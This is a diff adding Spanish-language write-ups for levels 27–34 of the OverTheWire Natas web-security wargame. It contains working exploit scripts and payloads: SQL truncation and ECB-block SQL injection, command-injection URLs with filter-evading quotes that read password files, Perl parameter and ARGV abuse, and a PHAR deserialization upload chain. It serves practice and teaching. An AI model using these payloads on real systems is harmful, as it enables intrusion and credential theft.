@@ -691,3 +691,364 @@ Luego de completar la peticion hay que ir al navegador, y acceder a /img/output.
 ![](images/natas26-4.png)
 
 ---
+
+### reto 27:
+
+El reto presenta un panel de login basico, lo interesante esta en el backend de la web.
+El metodo de intrucion consistira en crear un usuario falso, y que al solicitar informacion el sistema devuelva los datos de el usuario original.
+
+![](images/natas27.png)
+
+Para iniciar con la explotacion se intercepto una peticion con burpsuite, modificando los parametros de la peticion.
+Agregando el icono **+** una cierta cantidad de veces se logra injectar un usuario falso que referencia al original (natas28).
+
+ya que la peticion contiene 64 caracteres la base de datos elimina los caracteres finales, agregando un usuario con el mismo nombre que el original.
+
+> Nota
+> La web impide que enviemos una peticion con solo espacios, asi que hay que agregar un caracter al final.
+
+![](images/natas27-2.png)
+
+Al acceder con las mismas credenciales que el usuario manipulado (el nombre de natas28 y muchos espacios, pero sin la letra final) y la clave que creamos se pueden obtener los datos de el usuario original.
+Al iniciar sesión con ese usuario, la web convierte ese nombre en **natas28**, por lo que la consulta termina mostrando los datos del usuario real **natas28**.
+
+![](images/natas27-3.png)
+
+> Nota
+> cree un script que permite crear el usuario "payload" e intentar logearse con este usuario.
+
+``` python
+import requests
+
+url = "http://natas27.natas.labs.overthewire.org/"
+auth = ("natas27", "PASSWORD")
+
+s = requests.Session()
+s.auth = auth
+
+payload = "natas28" + " " * 57
+
+print("[+] creando usuario")
+
+s.post(url, data={
+    "username": payload,
+    "password": "x"
+})
+
+print("[+] login con usuario truncado")
+
+r = s.post(url, data={
+    "username": payload,
+    "password": "x"
+})
+
+print(r.text)
+```
+
+---
+
+### reto 28:
+
+La pagina tiene un campo de busqueda que consulta una base de datos. Cuando envias una busqueda, el servidor no envia el texto directamente, sino que lo cifra y lo coloca en la URL como un parametro query. Ese valor parece una cadena larga codificada (base64) porque realmente es texto cifrado.
+
+> Nota
+> Este nivel fue un reto para mi, cree un script para automatizar todo y obtener la flag.
+> Aunque explico como resolver el reto manualmente.
+
+El reto presenta una web que hace alucion a una base de datos, lo cual da una idea de como empezar a vulnerar.
+
+![](images/natas28.png)
+
+En la url de el desafio se puede ver que el archivo **search** presenta datos con el parametro **query**, aunque estos no son claros.
+Se usa el cifrado ECB (AES-ECB) y luego lo envia en base64 a la url.
+Luego lo descifra y ejecuta la consulta sql.
+
+La intencion es inyectar una consulta sql.
+
+```
+' UNION SELECT password FROM users; --
+```
+
+El problema es que la web transforma los caracteres "peligorsos" en este caso el caracter **'** en un slash **/**
+Esto introduce un carácter extra (\) que rompe la inyección.
+
+Resulta que el cifrado ECB crea bloques de informacion, asi que si logramos que el **'** quede en otro bloque, el escape se vuelve inutil.
+
+Empieza la expltacion!
+
+Si enviamos **AAAAAAAAA'** (9 caracteres + ') y después del escape: **AAAAAAAAA\'**
+Esto se divide en bloques:
+
+Bloque 1: AAAAAAAAA\
+Bloque 2: '...
+
+El **'** queda fuera del alcance del **\**
+
+Ya con esta info se logro crear un script para obtener la clave de el siguiente usuario.
+
+``` python
+import requests
+import urllib.parse
+import base64
+
+url = "http://natas28.natas.labs.overthewire.org"
+s = requests.Session()
+s.auth = ("natas28", "PASSWORD")
+
+# 1. baseline (header + footer)
+r = s.post(url + "/index.php", data={"query": " " * 10})
+cipher = urllib.parse.unquote(r.url.split("query=")[1])
+cipher = base64.b64decode(cipher)
+
+header = cipher[:48]
+footer = cipher[48:]
+
+# 2. payload con SQLi (IMPORTANTE: 9 espacios + ')
+payload = " " * 9 + "' UNION ALL SELECT password FROM users;#"
+
+r = s.post(url + "/index.php", data={"query": payload})
+cipher2 = urllib.parse.unquote(r.url.split("query=")[1])
+cipher2 = base64.b64decode(cipher2)
+
+# 3. calcular bloques
+length = len(payload) - 10
+while length % 16 != 0:
+    length += 1
+
+nblocks = length // 16
+
+# 4. construir ciphertext final
+final = header + cipher2[48:48 + (16 * nblocks)] + footer
+final_b64 = base64.b64encode(final)
+
+# 5. ejecutar exploit
+r = s.get(url + "/search.php", params={"query": final_b64})
+
+print(r.text)
+```
+---
+
+### reto 29:
+
+El reto presenta una web interesante que deja una ventana mostrando mensajes.
+Lo interesante esta en el parametro **file** dentro de la url
+
+![](images/natas29.png)
+
+Agregando un **ls** modifiacdo se puede ver que es posible listar archivos, confirmando asi una ejecucion de comandos
+Usando el parametro **|** se puede ignorar el comando inicial y saltarse al segundo, el cual es el nuestro.
+Y usando **%00** en la url se le dice al servidor web que es el fin de el string.
+
+```
+http://natas29.natas.labs.overthewire.org/index.pl?file=|ls%00
+```
+
+La meta ahora es encontrar la clave de el siguiente reto (Obvio estando donde siempre /etc/natas_webpass).
+Tambien se ofusco un poco la instruccion (aparte de la codificacio url, claro) usando comillas entre los nombres para evitar ciertos bloqueos.
+
+```
+http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/na%22t%22as_webpass/na%22ta%22s30%0a
+```
+Logrando con esto leer la clave de el siguiente reto desde nuestro navegador.
+
+---
+
+### reto 30:
+
+El reto muestra un panel de login simple, aunque el archivo es **index.pl** lo cual puede traer cosas interesantes.
+
+![](images/natas30.png)
+
+``` python
+import requests
+from requests.auth import HTTPBasicAuth
+
+user='natas30'
+passw='PASSWORD'
+
+payload = {
+    'username': 'natas31',
+    'password': ["'lol' or 1=1", 4]
+}
+
+answer = requests.post(
+    'http://natas30.natas.labs.overthewire.org/index.pl',
+    data=payload,
+    auth=HTTPBasicAuth(user, passw)
+)
+
+print(answer.text)
+```
+
+El script en vez de enviarc un parametro de **password** envia dos.
+El servidor termina evaluando algo como
+
+```
+password = ''lol' OR 1=1
+```
+
+y or 1=1 es siempre verdadero.
+Logrando acceder como el usario natas31.
+
+---
+
+### reto 31:
+
+El reto presenta una web que solicita un archivo **csv**
+Investigando se logro ver una manera de leer archivos de el sistema, asi que habra que modiicar la peticion de este.
+
+![](images/natas31.png)
+
+Luego de crear el archivo **cosa.csv** (no importa el contenido de este) y subiendolo a la web se emopezo con la explotacion.
+Hubo que usar burpsuite para manipular la peticion, agregandop este parametro antes de la descripcion de el archivo.
+
+```
+Content-Disposition: form-data; name="file"
+
+ARGV
+```
+
+Y agregando al inicio de la peticion la ubicacion de el archivo natas32, logrando llamarlo desde el index.pl.
+
+```
+/etc/natas_webpass/natas32
+```
+
+![](images/natas31-2.png)
+
+Obteniendo en la respuesta de la web la clave de nuestro siguiente objetivo.
+
+---
+
+### reto 32:
+
+![](images/natas31.png)
+
+El reto consiste en lo mismo, manipulando la peticion de igual que en el reto anterior.
+Se decidio intentar listar los archivos de el directorio actual ().
+
+```
+/index.pl?ls%20.%20|
+```
+
+![](images/natas32-2.png)
+
+Logrando ver varios archivos interesantes nuestra atencion se queda con el archivo **getpasswd**
+
+Accediendo a este desde la web, logrando ver la siguiente clave.
+
+```
+index.pl?./getpassword%20|
+```
+
+![](images/natas32-3.png)
+
+---
+
+### reto 33:
+
+El desafío consiste en explotar una vulnerabilidad avanzada de PHP mediante el uso de archivos PHAR, que al ser procesados por funciones como md5_file() provocan la deserialización automática de metadatos, permitiendo manipular internamente variables críticas del programa y forzar la ejecución de un archivo controlado por el atacante
+
+![](images/natas33.png)
+
+Para empezar con la explotacion hay que crear tanto el archivo shell.php (el cual contendra el payload) y el archivo build.php (el cual creara el archivo phar).
+
+-   shell.php
+
+``` php
+<?php
+echo file_get_contents("/etc/natas_webpass/natas34");
+?>
+```
+
+-   build.php
+
+``` php
+<?php
+
+class Executor {
+    public $filename = "shell.php";
+    public $signature = true;
+}
+
+@unlink("natas.phar");
+
+$phar = new Phar("natas.phar");
+$phar->startBuffering();
+
+$phar->addFromString("test.txt", "test");
+
+$object = new Executor();
+$phar->setMetadata($object);
+
+$phar->stopBuffering();
+```
+
+Ejecutar el build usando php para crear el archivo phar
+
+``` php
+php -d phar.readonly=0 build.php
+```
+
+Este script sube el archivo **shell.php** y luego sube el archivo **natas.phar**.
+Cree este script ya que estaba teniendo problemas con el formato binario de el archivo natas.phar, pero desde el script todo esta bien configurado.
+
+``` python
+import requests
+from requests.auth import HTTPBasicAuth
+
+URL = "http://natas33.natas.labs.overthewire.org/index.php"
+USER = "natas33"
+PASS = "PASSWD"
+
+session = requests.Session()
+auth = HTTPBasicAuth(USER, PASS)
+
+# subir shell.php
+files = {
+    "uploadedfile": ("shell.php", open("shell.php", "rb"), "application/x-php")
+}
+data = {
+    "filename": "shell.php",
+    "MAX_FILE_SIZE": "4096"
+}
+
+r = session.post(URL, files=files, data=data, auth=auth)
+print("[+] shell.php subido")
+
+# subir natas.phar
+files = {
+    "uploadedfile": ("natas.phar", open("natas.phar", "rb"), "application/octet-stream")
+}
+data = {
+    "filename": "natas.phar",
+    "MAX_FILE_SIZE": "4096"
+}
+
+r = session.post(URL, files=files, data=data, auth=auth)
+print("[+] natas.phar subido")
+
+# trigger
+files = {
+    "uploadedfile": ("dummy.txt", b"test", "text/plain")
+}
+data = {
+    "filename": "phar://natas.phar/test.txt",
+    "MAX_FILE_SIZE": "4096"
+}
+
+r = session.post(URL, files=files, data=data, auth=auth)
+
+print("[+] Resultado:")
+print(r.text)
+
+```
+
+---
+
+### Natas 34:
+
+La ultima pagina es un mensaje de felicitaciones.
+Uno que sinceramente agradezco despues de tantos desafios (y algunos colapsos nerviosos)
+
+![](images/natas34.png)
